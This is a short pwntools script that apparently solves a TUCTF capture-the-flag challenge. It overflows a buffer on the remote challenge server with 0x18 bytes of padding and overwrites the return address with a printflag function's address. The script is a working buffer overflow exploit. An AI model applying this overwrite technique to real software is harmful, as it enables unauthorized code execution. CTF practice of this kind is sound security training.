from pwn import *

printflag = 0x080491F6
host, port =  "chal.tuctf.com", 30508
r = remote(host,port)
# r = process ('./thefirst')
raw_input('debug')

r.recvuntil('> ')
payload = 'a'*0x18
payload += p32(printflag)
r.sendline(payload)

r.interactive()
r.close()